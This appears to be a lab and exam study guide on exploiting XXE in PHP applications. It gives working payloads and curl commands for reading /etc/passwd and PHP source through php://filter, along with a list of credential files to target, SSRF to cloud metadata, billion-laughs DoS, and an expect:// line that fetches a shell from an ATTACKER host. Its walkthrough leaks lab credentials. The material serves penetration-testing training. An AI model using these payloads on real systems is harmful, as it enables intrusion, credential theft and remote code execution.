# Section 14 — Local File Disclosure (XXE)

---

## The Attack Pattern

```
1. Find a page that takes XML input
2. Confirm entity expansion works (define a benign entity, see if it renders)
3. Replace internal entity with external SYSTEM entity → file://, php://filter
4. Reflected output → file contents disclosed
```

If output is reflected, you read text files directly. For binary/PHP source, use `php://filter/convert.base64-encode`.

---

## Step 1 — Identify XML Input

Watch for:
- `Content-Type: application/xml` or `text/xml` in requests
- POST bodies that look like `<root>...</root>`
- AJAX functions that build XML strings client-side
- Forms whose JS handler calls `xmlhttp.send(xml)` instead of FormData/JSON

Inspect the form's JS file. From this lab's `js/main.js`:
```javascript
function XMLFunction(){
    var xml = '' +
        '<?xml version="1.0" encoding="UTF-8"?>\n' +
        '<root>\n' +
        '<name>' + $('#first-name').val() + '</name>\n' +
        '<tel>' + $('#phone').val() + '</tel>\n' +
        '<email>' + $('#email').val() + '</email>\n' +
        '<message>' + $('#message').val() + '</message>\n' +
        '</root>';
    xmlhttp.open("POST","submitDetails.php",true);
    xmlhttp.send(xml);
};
```

→ Form sends raw XML. The server probably parses it with libxml2/SimpleXML. Target the field whose value is reflected in the response.

---

## Step 2 — Confirm Entity Expansion

Define a benign internal entity and reference it in the reflected field:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<root>
  <name>x</name>
  <tel>1</tel>
  <email>&company;</email>
  <message>m</message>
</root>
```

Response includes `Inlane Freight` → entities are expanded.
Response includes literal `&company;` → entities are NOT expanded; XXE is not viable.

---

## Step 3 — Read a Text File

Replace the internal entity with an external `SYSTEM` reference:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

```bash
curl -sk -X POST http://TARGET/submitDetails.php \
  -H "Content-Type: application/xml" \
  --data $'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE email [\n<!ENTITY company SYSTEM "file:///etc/passwd">\n]>\n<root>\n<name>x</name>\n<tel>1</tel>\n<email>&company;</email>\n<message>m</message>\n</root>'
```

Response reflects the `/etc/passwd` content.

### High-value file targets

| OS | Path | Reveals |
|----|------|---------|
| Linux | `/etc/passwd` | User accounts |
| Linux | `/etc/shadow` | Password hashes (if readable by web user — rare) |
| Linux | `/etc/hosts` | Internal hostnames |
| Linux | `/proc/self/environ` | Environment variables — often DB creds, API keys |
| Linux | `/proc/self/cmdline` | Process command line |
| Linux | `/home/<user>/.ssh/id_rsa` | SSH private keys |
| Linux | `/home/<user>/.bash_history` | Command history |
| Linux | `/var/www/html/.env` | App secrets |
| Linux | `/var/log/apache2/access.log` | Log poisoning surface |
| Windows | `C:\Windows\System32\drivers\etc\hosts` | Hosts file |
| Windows | `C:\Windows\win.ini` | Classic file-read test target |
| Windows | `C:\inetpub\wwwroot\web.config` | IIS app config |

---

## Step 4 — Read Source Code (PHP)

Source code contains XML special chars (`<`, `>`, `&`, `?`) → reading via `file://` corrupts the entity expansion. Use the PHP wrapper to base64-encode before delivery:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Response contains a clean base64 blob. Decode locally:
```bash
echo "PD9waHAK..." | base64 -d
```

### PHP filter variants worth knowing

| Filter | Purpose |
|--------|---------|
| `php://filter/convert.base64-encode/resource=X` | Read file, encode to base64 (handles binary + special chars) |
| `php://filter/read=string.rot13/resource=X` | ROT13 — also bypasses some content filters |
| `php://filter/convert.iconv.UTF-8.UTF-16/resource=X` | Encoding shift |
| `php://filter/zlib.deflate/convert.base64-encode/resource=X` | Compress then encode (smaller output) |
| `php://filter/convert.base64-encode/resource=php://input` | Read POST body |

`php://filter` is PHP-specific. For Java targets, you'd use `jar://` or attempt to read the .class/.jsp files directly (they don't have problematic XML chars in most cases).

---

## Step 5 — Beyond File Read

### RCE via `expect://` (PHP, rare)
Requires the PHP `expect` extension (not default since PHP 7+):
```xml
<!ENTITY x SYSTEM "expect://id">
```

For commands with spaces, use `$IFS`:
```xml
<!ENTITY x SYSTEM "expect://curl$IFS-O$IFS'http://ATTACKER/shell.php'">
```

Special chars to avoid (break XML): `|`, `>`, `{`, `}`, `&`, `<`, `"`.

### SSRF
```xml
<!ENTITY x SYSTEM "http://127.0.0.1:8080/admin">
<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">  ← AWS metadata
```

### DoS — Billion Laughs
```xml
<!ENTITY a0 "DOS">
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
... up to a10 (10^10 expansion)
```
Modern parsers detect this and abort.

---

## Lab — Read `connection.php` api_key

**Target:** `10.129.98.124`

### Inspect form
```bash
curl -sk http://10.129.98.124/js/main.js
```
→ Form sends XML with `<email>` reflected.

### Payload
```bash
curl -sk -X POST http://10.129.98.124/submitDetails.php \
  -H "Content-Type: application/xml" \
  --data $'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE email [\n<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">\n]>\n<root>\n<name>test</name>\n<tel>1</tel>\n<email>&company;</email>\n<message>m</message>\n</root>'
```

Response:
```
Check your email PD9waHAKCiRhcGlfa2V5ID0gIlVUTTFOak0wTW1SekoyZG1jVEl6TkQwd01YSm5aWGRtYzJSbUNnIjsK... for further instructions.
```

### Decode
```bash
echo "PD9waHAKCiRhcGlfa2V5ID0gIlVUTTFOak0wTW1SekoyZG1jVEl6TkQwd01YSm5aWGRtYzJSbUNnIjsKCnRyeSB7CgkkY29ubiA9IHBnX2Nvbm5lY3QoImhvc3Q9bG9jYWxob3N0IHBvcnQ9NTQzMiBkYm5hbWU9dXNlcnMgdXNlcj1wb3N0Z3JlcyBwYXNzd29yZD1pVWVyXnZkKGUxUGw5Iik7Cn0KCmNhdGNoICggZXhjZXB0aW9uICRlICkgewogCWVjaG8gJGUtPmdldE1lc3NhZ2UoKTsKfQoKPz4K" | base64 -d
```

Output:
```php
<?php

$api_key = "UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg";

try {
	$conn = pg_connect("host=localhost port=5432 dbname=users user=postgres password=iUer^vd(e1Pl9");
}
```

> Bonus disclosure: PostgreSQL on localhost:5432 with creds `postgres:iUer^vd(e1Pl9` — useful for lateral movement in a real engagement.

**Q1 Answer (api_key):** `UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg`

---

## Why `file://` Failed on `index.php` But `php://filter` Worked

Source files contain `<?php`, `<`, `>`, `&` — all of which break the XML parser when included inline as entity content. The libxml2 parser tries to merge the file content into the document tree, hits invalid markup, and silently drops the entity (empty response).

`php://filter/convert.base64-encode` runs server-side BEFORE the content is handed to the XML parser — so the parser only sees A-Z, a-z, 0-9, `+`, `/`, `=`. All safe.

This is why **`php://filter` is the go-to for source code disclosure on PHP targets**.

---

## When Reflection Isn't There

If the response doesn't echo your XML field, file disclosure via this method fails. The next section covers **out-of-band (OOB) XXE** — exfiltrating data via DNS or HTTP callbacks to your own server, regardless of whether the response reflects.

---

## Exam Notes

- **Test order**: internal entity → external `file://` → external `php://filter` → SSRF → expect
- The reflected field is the output channel — find it before crafting payloads
- `php://filter/convert.base64-encode/resource=FILE` is the universal PHP source-read primitive
- Source code disclosure reveals **DB creds, API keys, secrets, hashing salts, internal endpoints** — often more valuable than the immediate file read
- `expect://` is gated by PHP extension availability — rarely available in modern installs
- `$IFS` substitutes for spaces; avoid `|`, `>`, `{`, `&`, quotes — they break XML
- DoS via billion-laughs is blocked on modern parsers — don't waste time on it during a real engagement (and don't run DoS on prod regardless)
- When the response field isn't reflected, jump to OOB XXE (Section 15)
